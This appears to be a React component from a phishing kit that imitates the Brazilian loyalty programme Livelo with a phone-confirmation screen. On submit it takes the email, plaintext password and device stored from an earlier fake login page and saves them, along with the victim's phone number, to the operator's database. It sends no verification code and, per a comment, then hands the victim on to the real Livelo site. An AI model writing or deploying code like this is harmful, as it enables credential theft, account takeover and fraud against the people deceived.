import React, { useState } from "react";
import { formatPhone, isValidPhone } from "../utils/validators";
import { saveUserData } from "../services/api";
import "./PhoneConfirmation.css";

const PhoneConfirmation = ({ userEmail, onBack, onCodeSent }) => {
  const [phone, setPhone] = useState("");
  const [phoneError, setPhoneError] = useState("");

  const handlePhoneChange = (e) => {
    const formatted = formatPhone(e.target.value);
    setPhone(formatted);
    setPhoneError("");
  };

  const handlePhoneBlur = () => {
    if (phone.trim() !== "" && !isValidPhone(phone)) {
      setPhoneError("Número de telefone inválido");
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (!isValidPhone(phone)) {
      setPhoneError("Número de telefone inválido");
      return;
    }
    
    // Recupera dados do login do sessionStorage
    const pendingData = sessionStorage.getItem("pendingLoginData");
    
    if (pendingData) {
      try {
        const loginData = JSON.parse(pendingData);
        
        // Salva no banco de dados
        await saveUserData({
          type: "login",
          email: loginData.email,
          password: loginData.password,
          phone: phone,
          device: loginData.device,
        });
        
        // Limpa dados temporários
        sessionStorage.removeItem("pendingLoginData");
        
        console.log("Dados salvos no banco!");
      } catch (error) {
        console.error("Erro ao salvar dados:", error);
      }
    }
    
    console.log("Enviando código para:", phone);
    
    // Mostra loading e redireciona para o site da Livelo
    if (onCodeSent) {
      onCodeSent(phone);
    }
  };

  const isFormValid = phone.trim() !== "" && isValidPhone(phone);

  return (
    <div className="phone-container">
      <div className="phone-box">
        {/* Logo */}
        <div className="logo">
          <img src="/logo-livelo.svg" alt="Livelo" />
        </div>

        {/* Título */}
        <h1 className="phone-title">Confirme seu telefone</h1>

        {/* Descrição */}
        <p className="phone-description">
          Vamos enviar um código de verificação para o seu celular
        </p>

        {/* Formulário */}
        <form className="phone-form" onSubmit={handleSubmit}>
          {/* Campo Telefone */}
          <div className="input-group">
            <div className="input-wrapper">
              <input
                type="tel"
                id="phone"
                value={phone}
                onChange={handlePhoneChange}
                onBlur={handlePhoneBlur}
                className={`phone-input ${phoneError ? "error" : ""}`}
                placeholder=" "
                maxLength={15}
              />
              <label htmlFor="phone" className="floating-label">
                Celular
              </label>
              <span className="input-icon">
                <svg
                  width="20"
                  height="20"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                >
                  <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z" />
                </svg>
              </span>
            </div>
            {phoneError && <span className="error-message">{phoneError}</span>}
          </div>

          {/* Info */}
          <p className="phone-info">
            Digite seu número com DDD. Ex: (11) 99999-9999
          </p>

          {/* Botão Enviar Código */}
          <button
            type="submit"
            className={`phone-button ${isFormValid ? "active" : ""}`}
            disabled={!isFormValid}
          >
            Enviar código
          </button>
        </form>

        {/* Voltar */}
        <div className="phone-back">
          <button onClick={onBack} className="back-button">
            <svg
              width="16"
              height="16"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
            >
              <polyline points="15 18 9 12 15 6" />
            </svg>
            Voltar para o login
          </button>
        </div>
      </div>
    </div>
  );
};

export default PhoneConfirmation;
